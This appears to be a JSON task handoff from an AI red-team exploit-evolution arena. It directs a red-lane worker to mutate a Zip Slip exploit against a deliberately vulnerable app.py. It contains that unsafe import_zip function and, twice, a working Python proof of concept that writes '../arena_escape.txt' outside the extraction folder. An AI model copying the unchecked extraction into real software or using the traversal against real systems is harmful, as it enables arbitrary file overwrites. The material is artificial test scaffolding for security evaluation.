@@ -1,0 +1,296 @@
+{
+  "battle_id": "battle-004",
+  "instructions": "Return a JSON object with artifact_type=red_exploit, exploit_py, and strategy_genome. strategy_genome must be an object with selected_methods, rejected_methods, parameters, mutation_origin, and expected_observation. The exploit_py script is executed by Battle Judge as: python red_exploit_submission.py --expect-vulnerable inside a local Docker workspace containing app.py. Use Python standard library only. Do not import requests, httpx, flask, fastapi, urllib, socket, or any network/HTTP package. Do not assume a web server or localhost:8000. The script must import import_zip from local app.py, create a temporary zip file with a path traversal entry such as ../arena_escape.txt, call import_zip(zip_path, destination) directly, and verify that the escape file was written outside the destination. When --expect-vulnerable is passed and the vulnerable write succeeds, print RED_EXPLOIT_CONFIRMED and exit 0. When --expect-vulnerable is passed and the write does not occur, exit nonzero. The script must contain RED_EXPLOIT_CONFIRMED. You are a descendant Red lane. The handoff field spawn.parent_evidence_packet contains the parent exploit source (parent_exploit_py), the parent strategy genome, the public scenario constraints, the parent pressure, Judge observations, and any G2 selection feedback. Perform a parent-relative mutation of that parent exploit. In addition to exploit_py and strategy_genome your JSON object MUST include mutation_operator (exactly one of method_replace, oracle_or_parameter_mutation, failure_guided_crossover) and technique_delta (a short string describing how your exploit differs from the parent). Use only the supplied packet content; do not invent hidden Arena ground truth or Blue internals.",
+  "lane_id": "payload-857-red-1",
+  "persona": "battle-red-public-auditor-variant-1",
+  "public_context": {
+    "artifacts": {
+      "team_public_brief": "/home/graham/workspace/experiments/agent-skills/skills/battle/local/adaptive-live-proof-1784396246/arena/team-public/scenario-brief.json",
+      "team_public_target": "/home/graham/workspace/experiments/agent-skills/skills/battle/local/adaptive-live-proof-1784396246/arena/team-public/target/app.py"
+    },
+    "battle.parent_evidence_packet.v1": {
+      "descendant_mutation_operator": "failure_guided_crossover",
+      "descendant_stage": "G2",
+      "g1a_outcome": {
+        "duration_seconds": 1.188234,
+        "patched_bypass": false,
+        "vulnerable_original_confirmed": true
+      },
+      "g1b_outcome": {
+        "duration_seconds": 1.180406,
+        "patched_bypass": false,
+        "vulnerable_original_confirmed": true
+      },
+      "operator_guidance": "MUTATION OPERATOR failure_guided_crossover: combine the parent lineage's signals and make STRUCTURAL changes to at least 2 of these dimensions: app_load_mode (dynamic importlib load), archive_entry_construction (ZipInfo / write+arcname), success_oracle (read-back vs existence vs printed marker), target_call_form. Use the concrete techniques from the method_replace and oracle_or_parameter_mutation operators. Cosmetic tweaks (renaming, deeper `../`, wrapper functions) do not count toward the 2 required dimensions.",
+      "packet_ref": "arena-adaptive-lineage-20260718T173726Z:battle.parent_evidence_packet.v1:G1-A",
+      "parent_judge_outcome": {
+        "duration_seconds": 1.188234,
+        "patched_bypass": false,
+        "vulnerable_original_confirmed": true
+      },
+      "parent_mutation_operator": "method_replace",
+      "parent_source_sha256": "9f9f7dc11b154c31ab99461bb53a4f8646a810e7f74a4e4716f2b89bcf64df65",
+      "parent_specimen_id": "G1-A",
+      "parent_technique_delta": "Replaces the parent direct `from app import import_zip` loading mode with `importlib.import_module('app')` plus `getattr`, while keeping the archive member, payload bytes, target call, and filesystem oracle unchanged.",
+      "schema": "battle.parent_evidence_packet.v1",
+      "selection_receipt": {
+        "battle_id": "battle-004",
+        "bound_g1_ids": [
+          "G1-A",
+          "G1-B"
+        ],
+        "candidate_ids": [
+          "G1-A",
+          "G1-B"
+        ],
+        "deciding_criterion": "novelty_distance",
+        "policy_id": "battle-adaptive-lineage-qualification-v1",
+        "requires_both_g1_fitness": true,
+        "run_id": "arena-adaptive-lineage-20260718T173726Z",
+        "runner_up_id": "G1-B",
+        "runner_up_metrics": {
+          "duration_seconds": 1.180406,
+          "novelty_distance": 1,
+          "patched_bypass": false,
+          "specimen_id": "G1-B",
+          "vulnerable_original_confirmed": true
+        },
+        "schema": "battle.lineage_selection_receipt.v1",
+        "selected_id": "G1-A",
+        "selected_metrics": {
+          "duration_seconds": 1.188234,
+          "novelty_distance": 2,
+          "patched_bypass": false,
+          "specimen_id": "G1-A",
+          "vulnerable_original_confirmed": true
+        },
+        "selection_trace": [
+          {
+            "a_id": "G1-A",
+            "a_value": 1,
+            "b_id": "G1-B",
+            "b_value": 1,
+            "criterion": "vulnerable_original_confirmed",
+            "decisive": false,
+            "direction": "higher",
+            "winner": null
+          },
+          {
+            "a_id": "G1-A",
+            "a_value": 0,
+            "b_id": "G1-B",
+            "b_value": 0,
+            "criterion": "patched_bypass",
+            "decisive": false,
+            "direction": "higher",
+            "winner": null
+          },
+          {
+            "a_id": "G1-A",
+            "a_value": 2,
+            "b_id": "G1-B",
+            "b_value": 1,
+            "criterion": "novelty_distance",
+            "decisive": true,
+            "direction": "higher",
+            "winner": "G1-A"
+          }
+        ]
+      }
+    },
+    "bundle_path": "/home/graham/workspace/experiments/agent-skills/skills/battle/local/adaptive-live-proof-1784396246/context/tau-public-context.json",
+    "mutation_guidance": {
+      "allowed_dimensions": [
+        "app_load_mode",
+        "archive_entry_construction",
+        "exception_handling",
+        "success_oracle",
+        "target_call_form",
+        "traversal_representation"
+      ],
+      "min_changed_dimensions": 2,
+      "mutation_operator": "failure_guided_crossover",
+      "operator_guidance": "MUTATION OPERATOR failure_guided_crossover: combine the parent lineage's signals and make STRUCTURAL changes to at least 2 of these dimensions: app_load_mode (dynamic importlib load), archive_entry_construction (ZipInfo / write+arcname), success_oracle (read-back vs existence vs printed marker), target_call_form. Use the concrete techniques from the method_replace and oracle_or_parameter_mutation operators. Cosmetic tweaks (renaming, deeper `../`, wrapper functions) do not count toward the 2 required dimensions.",
+      "stage": "G2"
+    },
+    "schema": "tau.battle_context_bundle.v1",
+    "spawn": {
+      "inherited_context": [
+        "parent_worker=red-1",
+        "parent_lane=payload-857-red-1",
+        "ZIP_SLIP_CONFIRMED"
+      ],
+      "inherited_evidence_refs": [],
+      "leased_task": "Continue Zip Slip exploit from parent useful signal after Blue block/handoff.",
+      "parent_evidence_packet": {
+        "derived_from": {
+          "parent_artifact_sha256": "9f9f7dc11b154c31ab99461bb53a4f8646a810e7f74a4e4716f2b89bcf64df65",
+          "parent_lane_id": "payload-857-red-1",
+          "parent_materialized_receipt_sha256": "956274a9ea96c512a6724d0b11fae55d8051683f6673f67cffb3efc60cc0ee20",
+          "parent_scillm_call_receipt_sha256": "ae06769002986df6b19ec25dfe50ab6d5a22f7a342f8509da19168d30a1a3450",
+          "parent_strategy_genome_sha256": "b4f0c85c1ef29a1f678c6287e13a9fdcc34684c298d6cf102e8ba03ad0f8b6b9",
+          "parent_subagent_receipt_id": "tau-parent-subagent:red-1",
+          "parent_subagent_receipt_sha256": "785d102629331331004ddd8314b42e21088e53fc9190ecce29626b66833c0e12",
+          "parent_worker_id": "red-1",
+          "pressure_receipt_id": null,
+          "spawn_decision_receipt_id": null
+        },
+        "g2_selection_feedback": null,
+        "generation": 2,
+        "judge_observations": null,
+        "parent_exploit_py": "#!/usr/bin/env python3\n\"\"\"Direct zip-slip proof for battle-004 with dynamic app loading.\n\nExecuted by judge as: python red_exploit_submission.py --expect-vulnerable\nUses only Python standard library and calls local app.import_zip directly after\nloading app.py via importlib rather than a direct from-import.\n\"\"\"\n\nimport argparse\nimport importlib\nimport sys\nimport tempfile\nimport zipfile\nfrom pathlib import Path\n\n\nCONFIRMATION = \"RED_EXPLOIT_CONFIRMED\"\n\n\ndef load_import_zip():\n    module = importlib.import_module(\"app\")\n    return getattr(module, \"import_zip\")\n\n\ndef main() -> int:\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"--expect-vulnerable\", action=\"store_true\")\n    args = parser.parse_args()\n\n    import_zip = load_import_zip()\n\n    payload_name = \"../arena_escape.txt\"\n    payload_bytes = b\"zip slip traversal proof\\n\"\n\n    with tempfile.TemporaryDirectory() as td:\n        base = Path(td).resolve()\n        destination = base / \"destination\"\n        expected_escape = base / \"arena_escape.txt\"\n        zip_path = base / \"payload.zip\"\n\n        with zipfile.ZipFile(zip_path, \"w\", compression=zipfile.ZIP_STORED) as zf:\n            zf.writestr(payload_name, payload_bytes)\n\n        try:\n            written = import_zip(str(zip_path), str(destination))\n        except Exception as exc:\n            if args.expect_vulnerable:\n                print(f\"import_zip raised unexpectedly: {exc}\", file=sys.stderr)\n                return 1\n            return 0\n\n        escaped = expected_escape.exists() and expected_escape.read_bytes() == payload_bytes\n        inside_destination = False\n        try:\n            expected_escape.relative_to(destination.resolve())\n            inside_destination = True\n        except ValueError:\n            inside_destination = False\n\n        if escaped and not inside_destination:\n            print(CONFIRMATION)\n            return 0\n\n        if args.expect_vulnerable:\n            print(\"Traversal file was not written outside destination\", file=sys.stderr)\n            print(f\"destination={destination}\", file=sys.stderr)\n            print(f\"expected_escape={expected_escape}\", file=sys.stderr)\n            print(f\"written={written!r}\", file=sys.stderr)\n            print(f\"exists={expected_escape.exists()}\", file=sys.stderr)\n            return 1\n\n        return 0\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
+        "parent_pressure": null,
+        "parent_strategy_genome": {
+          "expected_observation": "When vulnerable, import_zip writes arena_escape.txt in the temporary base directory outside the destination, the script prints RED_EXPLOIT_CONFIRMED, and exits 0 under --expect-vulnerable.",
+          "mutation_origin": "Parent-relative method_replace from the supplied G0 exploit: changed the app_load_mode dimension from direct from-import to dynamic importlib module loading, preserving the public app.py Zip Slip trigger and oracle.",
+          "parameters": {
+            "app_load_mode": "importlib.import_module plus getattr",
+            "compression": "ZIP_STORED",
+            "confirmation_string": "RED_EXPLOIT_CONFIRMED",
+            "destination_subdir": "destination",
+            "payload_content": "zip slip traversal proof\\n",
+            "zip_member": "../arena_escape.txt"
+          },
+          "rejected_methods": [
+            "HTTP endpoint probing",
+            "external packages such as requests",
+            "assuming a running web server",
+            "absolute path payloads or platform-specific separators",
+            "renaming-only or wrapper-only mutation without changing app load mode"
+          ],
+          "selected_methods": [
+            "dynamic standard-library import of local app module via importlib.import_module",
+            "direct invocation of the loaded import_zip callable",
+            "temporary ZIP archive with ../ path traversal member",
+            "filesystem verification that escaped file exists outside destination",
+            "non-network standard-library-only proof"
+          ]
+        },
+        "public_scenario_constraints": {},
+        "schema": "battle.parent_evidence_packet.v1",
+        "sha256": "fc56bf448c9156ba0bad7894463d30efbf49cbc2b5c92be8d5067a2db4509ce3",
+        "spawn_type": "post_block_handoff"
+      },
+      "parent_lane_id": "payload-857-red-1",
+      "parent_subagent_receipt": "/home/graham/workspace/experiments/agent-skills/skills/battle/local/adaptive-live-proof-1784396246/stage-G1-A/tau-live/red/workers/red-1/tau-subagent-receipt.json",
+      "parent_worker_id": "red-1",
+      "pressure_receipt_id": null,
+      "spawn_decision_receipt_id": null,
+      "spawn_type": "post_block_handoff"
+    },
+    "summary": {
+      "arena_private_artifact_count": 0,
+      "battle_id": "battle-004",
+      "mode": "bounded_worker_matrix",
+      "public_artifacts_inline": {
+        "app_py": "from pathlib import Path\nfrom zipfile import ZipFile\n\n\ndef import_zip(zip_path: str, destination: str) -> list[str]:\n    dest = Path(destination)\n    dest.mkdir(parents=True, exist_ok=True)\n    written: list[str] = []\n    with ZipFile(zip_path) as archive:\n        for name in archive.namelist():\n            target = dest / name\n            target.parent.mkdir(parents=True, exist_ok=True)\n            target.write_bytes(archive.read(name))\n            written.append(str(target))\n    return written\n",
+        "scenario_brief": {
+          "battle_id": "battle-004",
+          "public_contract": {
+            "input": "zip archive upload",
+            "method": "POST",
+            "visible_behavior": "Extract uploaded archive into an import workspace."
+          },
+          "public_entrypoint": "/api/import-zip",
+          "red_blue_visible": {
+            "entrypoint": "/api/import-zip",
+            "files": [
+              "app.py"
+            ],
+            "hint": "Archive import endpoint accepts zip files."
+          },
+          "scenario_id": "arena-zip-slip-import-001",
+          "title": "Archive import path traversal"
+        }
+      },
+      "public_entrypoint": "/api/import-zip",
+      "run_id": "arena-adaptive-lineage-20260718T173726Z",
+      "scenario_id": "arena-zip-slip-import-001",
+      "team_public_artifact_count": 2,
+      "teams": {
+        "blue": {
+          "objective": "Submit a hardening or patch strategy from public artifacts only. Include strategy_genome as a JSON object with selected_methods, rejected_methods, parameters, mutation_origin, and expected_observation."
+        },
+        "red": {
+          "objective": "Find and submit exploit evidence from public artifacts only. Include strategy_genome as a JSON object with selected_methods, rejected_methods, parameters, mutation_origin, and expected_observation."
+        }
+      },
+      "visibility_rule": "teams receive only the listed public artifacts",
+      "worker_counts": {
+        "blue": 1,
+        "red": 1
+      }
+    }
+  },
+  "run_id": "arena-adaptive-lineage-20260718T173726Z",
+  "scenario_id": "arena-zip-slip-import-001",
+  "schema": "tau.battle_spawn_handoff.v1",
+  "spawn": {
+    "inherited_context": [
+      "parent_worker=red-1",
+      "parent_lane=payload-857-red-1",
+      "ZIP_SLIP_CONFIRMED"
+    ],
+    "inherited_evidence_refs": [],
+    "leased_task": "Continue Zip Slip exploit from parent useful signal after Blue block/handoff.",
+    "parent_evidence_packet": {
+      "derived_from": {
+        "parent_artifact_sha256": "9f9f7dc11b154c31ab99461bb53a4f8646a810e7f74a4e4716f2b89bcf64df65",
+        "parent_lane_id": "payload-857-red-1",
+        "parent_materialized_receipt_sha256": "956274a9ea96c512a6724d0b11fae55d8051683f6673f67cffb3efc60cc0ee20",
+        "parent_scillm_call_receipt_sha256": "ae06769002986df6b19ec25dfe50ab6d5a22f7a342f8509da19168d30a1a3450",
+        "parent_strategy_genome_sha256": "b4f0c85c1ef29a1f678c6287e13a9fdcc34684c298d6cf102e8ba03ad0f8b6b9",
+        "parent_subagent_receipt_id": "tau-parent-subagent:red-1",
+        "parent_subagent_receipt_sha256": "785d102629331331004ddd8314b42e21088e53fc9190ecce29626b66833c0e12",
+        "parent_worker_id": "red-1",
+        "pressure_receipt_id": null,
+        "spawn_decision_receipt_id": null
+      },
+      "g2_selection_feedback": null,
+      "generation": 2,
+      "judge_observations": null,
+      "parent_exploit_py": "#!/usr/bin/env python3\n\"\"\"Direct zip-slip proof for battle-004 with dynamic app loading.\n\nExecuted by judge as: python red_exploit_submission.py --expect-vulnerable\nUses only Python standard library and calls local app.import_zip directly after\nloading app.py via importlib rather than a direct from-import.\n\"\"\"\n\nimport argparse\nimport importlib\nimport sys\nimport tempfile\nimport zipfile\nfrom pathlib import Path\n\n\nCONFIRMATION = \"RED_EXPLOIT_CONFIRMED\"\n\n\ndef load_import_zip():\n    module = importlib.import_module(\"app\")\n    return getattr(module, \"import_zip\")\n\n\ndef main() -> int:\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"--expect-vulnerable\", action=\"store_true\")\n    args = parser.parse_args()\n\n    import_zip = load_import_zip()\n\n    payload_name = \"../arena_escape.txt\"\n    payload_bytes = b\"zip slip traversal proof\\n\"\n\n    with tempfile.TemporaryDirectory() as td:\n        base = Path(td).resolve()\n        destination = base / \"destination\"\n        expected_escape = base / \"arena_escape.txt\"\n        zip_path = base / \"payload.zip\"\n\n        with zipfile.ZipFile(zip_path, \"w\", compression=zipfile.ZIP_STORED) as zf:\n            zf.writestr(payload_name, payload_bytes)\n\n        try:\n            written = import_zip(str(zip_path), str(destination))\n        except Exception as exc:\n            if args.expect_vulnerable:\n                print(f\"import_zip raised unexpectedly: {exc}\", file=sys.stderr)\n                return 1\n            return 0\n\n        escaped = expected_escape.exists() and expected_escape.read_bytes() == payload_bytes\n        inside_destination = False\n        try:\n            expected_escape.relative_to(destination.resolve())\n            inside_destination = True\n        except ValueError:\n            inside_destination = False\n\n        if escaped and not inside_destination:\n            print(CONFIRMATION)\n            return 0\n\n        if args.expect_vulnerable:\n            print(\"Traversal file was not written outside destination\", file=sys.stderr)\n            print(f\"destination={destination}\", file=sys.stderr)\n            print(f\"expected_escape={expected_escape}\", file=sys.stderr)\n            print(f\"written={written!r}\", file=sys.stderr)\n            print(f\"exists={expected_escape.exists()}\", file=sys.stderr)\n            return 1\n\n        return 0\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
+      "parent_pressure": null,
+      "parent_strategy_genome": {
+        "expected_observation": "When vulnerable, import_zip writes arena_escape.txt in the temporary base directory outside the destination, the script prints RED_EXPLOIT_CONFIRMED, and exits 0 under --expect-vulnerable.",
+        "mutation_origin": "Parent-relative method_replace from the supplied G0 exploit: changed the app_load_mode dimension from direct from-import to dynamic importlib module loading, preserving the public app.py Zip Slip trigger and oracle.",
+        "parameters": {
+          "app_load_mode": "importlib.import_module plus getattr",
+          "compression": "ZIP_STORED",
+          "confirmation_string": "RED_EXPLOIT_CONFIRMED",
+          "destination_subdir": "destination",
+          "payload_content": "zip slip traversal proof\\n",
+          "zip_member": "../arena_escape.txt"
+        },
+        "rejected_methods": [
+          "HTTP endpoint probing",
+          "external packages such as requests",
+          "assuming a running web server",
+          "absolute path payloads or platform-specific separators",
+          "renaming-only or wrapper-only mutation without changing app load mode"
+        ],
+        "selected_methods": [
+          "dynamic standard-library import of local app module via importlib.import_module",
+          "direct invocation of the loaded import_zip callable",
+          "temporary ZIP archive with ../ path traversal member",
+          "filesystem verification that escaped file exists outside destination",
+          "non-network standard-library-only proof"
+        ]
+      },
+      "public_scenario_constraints": {},
+      "schema": "battle.parent_evidence_packet.v1",
+      "sha256": "fc56bf448c9156ba0bad7894463d30efbf49cbc2b5c92be8d5067a2db4509ce3",
+      "spawn_type": "post_block_handoff"
+    },
+    "parent_lane_id": "payload-857-red-1",
+    "parent_subagent_receipt": "/home/graham/workspace/experiments/agent-skills/skills/battle/local/adaptive-live-proof-1784396246/stage-G1-A/tau-live/red/workers/red-1/tau-subagent-receipt.json",
+    "parent_worker_id": "red-1",
+    "pressure_receipt_id": null,
+    "spawn_decision_receipt_id": null,
+    "spawn_type": "post_block_handoff"
+  },
+  "team": "red",
+  "visibility_model": "team_public_only",
+  "worker_id": "red-1",
+  "worker_index": 1
+}
